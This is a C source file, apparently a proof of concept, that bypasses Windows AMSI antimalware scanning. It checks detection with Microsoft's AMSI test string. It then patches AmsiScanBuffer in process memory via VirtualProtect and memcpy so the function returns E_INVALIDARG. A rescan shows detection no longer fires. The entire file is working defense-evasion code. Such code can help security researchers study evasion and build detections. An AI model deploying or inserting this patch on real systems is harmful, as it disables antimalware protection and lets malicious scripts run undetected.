#include <windows.h>
#include <stdio.h>

typedef enum AMSI_RESULT {
    AMSI_RESULT_CLEAN                  = 0,
    AMSI_RESULT_NOT_DETECTED           = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END   = 0x4FFF,
    AMSI_RESULT_DETECTED               = 0x8000
} AMSI_RESULT;

typedef PVOID HAMSICONTEXT;
typedef PVOID HAMSISESSION;

typedef HRESULT (WINAPI *fnAmsiInitialize)(LPCWSTR appName, HAMSICONTEXT *amsiContext);
typedef HRESULT (WINAPI *fnAmsiScanString)(HAMSICONTEXT amsiContext, LPCWSTR string,
                                           LPCWSTR contentName, HAMSISESSION amsiSession,
                                           AMSI_RESULT *result);
typedef VOID    (WINAPI *fnAmsiUninitialize)(HAMSICONTEXT amsiContext);

static fnAmsiInitialize   pAmsiInitialize;
static fnAmsiScanString   pAmsiScanString;
static fnAmsiUninitialize pAmsiUninitialize;

// Checking AMSI Scanning
BOOL CheckAMSI(void) {
    HAMSICONTEXT ctx;
    if (pAmsiInitialize(L"AMSI Test", &ctx) != S_OK) {
        printf("[-] Failed to initialize AMSI context\n");
        return FALSE;
    }

    // Tesing using this string https://learn.microsoft.com/en-us/defender-endpoint/mde-demonstration-amsi#test-amsi-with-powershell

    LPCWSTR testString = L"AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386";
    AMSI_RESULT result;
    HRESULT hr = pAmsiScanString(ctx, testString, L"AMSI Test", NULL, &result);
    pAmsiUninitialize(ctx);

    if (hr != S_OK) {
        printf("[-] AmsiScanString failed: 0x%08lX\n", hr);
        return FALSE;
    }

    printf("[+] AmsiScanString result: 0x%08X\n", result);
    return result >= AMSI_RESULT_DETECTED;
}

// Printing bytes for AmsiScanBuffer
VOID PrintBytes(PVOID pAddress, SIZE_T size) {
    BYTE* pBytes = (BYTE*)pAddress;
    for (SIZE_T i = 0; i < size; i++) {
        printf("%02X ", pBytes[i]);
    }
    printf("\n");
}

int main(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        printf("[-] Failed to load amsi.dll\n");
        return 1;
    }
    printf("[+] Amsi.dll loaded at: 0x%p\n", hAmsi);

    pAmsiInitialize   = (fnAmsiInitialize)(void*)GetProcAddress(hAmsi, "AmsiInitialize");
    pAmsiScanString   = (fnAmsiScanString)(void*)GetProcAddress(hAmsi, "AmsiScanString");
    pAmsiUninitialize = (fnAmsiUninitialize)(void*)GetProcAddress(hAmsi, "AmsiUninitialize");

    if (!pAmsiInitialize || !pAmsiScanString || !pAmsiUninitialize) {
        printf("[-] Failed to resolve AMSI functions\n");
        return 1;
    }

    printf("[*] Pre-patch AMSI check:\n");
    if (CheckAMSI()){
        printf("[+] AMSI DETECTED the test string\n\n");
    }
    else
    {
        printf("[-] AMSI did NOT detect the test string\n\n");
    }

    PVOID pAmsiScanBuffer = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer == NULL) {
        printf("[-] Failed to get address of AmsiScanBuffer\n");
        return 1;
    }
    printf("[+] AmsiScanBuffer address: 0x%p\n", pAmsiScanBuffer);

    printf("[+] Original bytes: ");
    PrintBytes(pAmsiScanBuffer, 6);

    BYTE patchBytes[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057 (E_INVALIDARG)
        0xC3                           // ret
    };

    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patchBytes), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] Failed to change memory protection\n");
        return 1;
    }

    memcpy(pAmsiScanBuffer, patchBytes, sizeof(patchBytes));

    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patchBytes), oldProtect, &oldProtect)) {
        printf("[-] Failed to restore memory protection\n");
        return 1;
    }

    printf("[+] AmsiScanBuffer patched successfully\n");
    printf("[+] Patched bytes: ");
    PrintBytes(pAmsiScanBuffer, sizeof(patchBytes));

    printf("\n[*] Post-patch AMSI check:\n");
    if (CheckAMSI())
    {
        printf("[+] AMSI DETECTED the test string\n");
    }
    else
    {
        printf("[-] AMSI did NOT detect the test string\n");
    }

    return 0;
}
